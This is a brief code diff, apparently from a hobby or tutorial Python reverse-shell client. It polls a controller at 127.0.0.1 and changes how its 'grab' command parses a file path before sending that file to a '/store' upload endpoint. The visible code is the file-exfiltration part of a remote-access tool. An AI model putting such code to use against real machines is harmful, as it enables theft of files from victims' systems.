@@ -31,8 +31,8 @@ while True:
                 post_response = requests.post(url='http://127.0.0.1',
                                               data='[-] The system cannot find the path specified.')
 
-    elif 'grab*' in command:
-        grab, path = command.split('*')
+    elif 'grab' in command:
+        grab, path = command.split(' ',1)
 
         if os.path.exists(path):
             url = 'http://127.0.0.1/store'  # "/store" indicate that we'll transfer a file
